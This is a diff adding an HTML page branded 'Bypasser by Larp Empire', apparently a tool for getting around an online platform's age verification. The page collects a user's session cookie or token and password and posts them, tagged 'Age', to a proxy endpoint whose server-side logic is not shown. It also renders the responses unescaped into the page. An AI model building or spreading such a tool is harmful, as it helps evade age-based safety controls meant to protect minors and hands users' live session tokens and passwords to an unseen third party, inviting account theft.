@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bypasser by Larp Empire</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 720px;
+            width: 100%;
+            background: #0f0f0f;
+            border: 2px solid #00ff88;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.15);
+        }
+        h1 {
+            font-size: 3rem;
+            text-align: center;
+            color: #00ff88;
+            text-shadow: 0 0 20px #00ff88;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #00cc77;
+            font-size: 1.1rem;
+            letter-spacing: 3px;
+            margin-bottom: 30px;
+            border-bottom: 1px dashed #1a4a3a;
+            padding-bottom: 16px;
+        }
+        .field {
+            margin-bottom: 20px;
+        }
+        .field label {
+            display: block;
+            color: #00cc77;
+            font-weight: bold;
+            font-size: 0.9rem;
+            letter-spacing: 2px;
+            margin-bottom: 6px;
+        }
+        .field textarea,
+        .field input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #111111;
+            border: 1px solid #00ff88;
+            border-radius: 8px;
+            color: #00ffaa;
+            font-size: 0.95rem;
+            outline: none;
+            transition: 0.3s;
+            resize: vertical;
+        }
+        .field textarea {
+            min-height: 110px;
+        }
+        .field textarea:focus,
+        .field input:focus {
+            border-color: #88ffcc;
+            box-shadow: 0 0 18px rgba(0, 255, 136, 0.25);
+            background: #0d0d0d;
+        }
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: #00dd77;
+            border: none;
+            border-radius: 10px;
+            color: #0a0a0a;
+            font-size: 1.5rem;
+            font-weight: bold;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #00ff99;
+            transform: scale(1.01);
+            box-shadow: 0 0 50px #00ff88;
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            transform: scale(0.98);
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        .response-box {
+            margin-top: 22px;
+            background: #111111;
+            border: 1px solid #00ff88;
+            border-radius: 8px;
+            padding: 16px;
+            min-height: 130px;
+            max-height: 350px;
+            overflow-y: auto;
+            color: #00ffaa;
+            font-size: 0.9rem;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        .response-box label {
+            display: block;
+            color: #00cc77;
+            font-weight: bold;
+            font-size: 0.85rem;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+        }
+        .status {
+            text-align: center;
+            margin-top: 18px;
+            color: #559988;
+            font-size: 0.8rem;
+            border-top: 1px dashed #1a4a3a;
+            padding-top: 16px;
+        }
+        .status span {
+            color: #00ff88;
+        }
+        ::-webkit-scrollbar {
+            width: 8px;
+            background: #0a0a0a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #00ff88;
+            border-radius: 4px;
+        }
+        .error-text {
+            color: #ff4466;
+        }
+        .success-text {
+            color: #00ff88;
+        }
+        .loading {
+            color: #ffcc00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>BYPASSER</h1>
+        <div class="subtitle">by Larp Empire</div>
+
+        <div class="field">
+            <label>🍪 COOKIE / TOKEN</label>
+            <textarea id="cookieInput" placeholder="Introdu token-ul aici..."></textarea>
+        </div>
+
+        <div class="field">
+            <label>🔑 PASSWORD</label>
+            <input type="text" id="passwordInput" placeholder="Introdu parola...">
+        </div>
+
+        <button class="btn" id="submitBtn">▶ SUBMIT</button>
+
+        <div class="response-box" id="responseBox">
+            <label>📌 RESPONSE</label>
+            <div id="responseContent">Așteaptă trimiterea...</div>
+        </div>
+
+        <div class="status">
+            <span>mod made by Vortex</span> &bull; immortal.st
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const cookieInput = document.getElementById('cookieInput');
+            const passwordInput = document.getElementById('passwordInput');
+            const submitBtn = document.getElementById('submitBtn');
+            const responseContent = document.getElementById('responseContent');
+
+            const API_URL = '/api/proxy';
+
+            function setResponse(text, type = 'info') {
+                const colors = {
+                    'error': 'error-text',
+                    'success': 'success-text',
+                    'loading': 'loading',
+                    'info': ''
+                };
+                const className = colors[type] || '';
+                responseContent.innerHTML = `<span class="${className}">${text}</span>`;
+            }
+
+            async function performBypass() {
+                const cookie = cookieInput.value.trim();
+                const password = passwordInput.value.trim();
+
+                if (!cookie) {
+                    setResponse('❌ Eroare: Câmpul COOKIE este gol.', 'error');
+                    return;
+                }
+                if (!password) {
+                    setResponse('❌ Eroare: Câmpul PASSWORD este gol.', 'error');
+                    return;
+                }
+
+                submitBtn.disabled = true;
+                submitBtn.textContent = '⏳ PROCESARE...';
+                setResponse('🔄 Se trimite cererea către proxy...', 'loading');
+
+                try {
+                    const payload = {
+                        token: cookie,
+                        password: password,
+                        type: 'Age'
+                    };
+
+                    const response = await fetch(API_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    const rawText = await response.text();
+
+                    try {
+                        const jsonData = JSON.parse(rawText);
+                        const formatted = JSON.stringify(jsonData, null, 2);
+
+                        if (jsonData.status === 'success') {
+                            setResponse(`✅ SUCCESS\n\n${formatted}`, 'success');
+                        } else if (jsonData.error) {
+                            setResponse(`❌ ERROR\n\n${jsonData.error}`, 'error');
+                        } else {
+                            setResponse(`📄 RESPONSE\n\n${formatted}`, 'info');
+                        }
+                    } catch (e) {
+                        if (rawText.includes('error') || rawText.includes('Error')) {
+                            setResponse(`❌ ERROR\n\n${rawText}`, 'error');
+                        } else {
+                            setResponse(`📄 RAW RESPONSE\n\n${rawText}`, 'info');
+                        }
+                    }
+
+                } catch (error) {
+                    setResponse(`❌ Network Error\n\n${error.message}`, 'error');
+                }
+
+                submitBtn.disabled = false;
+                submitBtn.textContent = '▶ SUBMIT';
+            }
+
+            submitBtn.addEventListener('click', performBypass);
+
+            passwordInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    submitBtn.click();
+                }
+            });
+
+            setResponse('Așteaptă trimiterea...', 'info');
+        })();
+    </script>
+</body>
+</html>
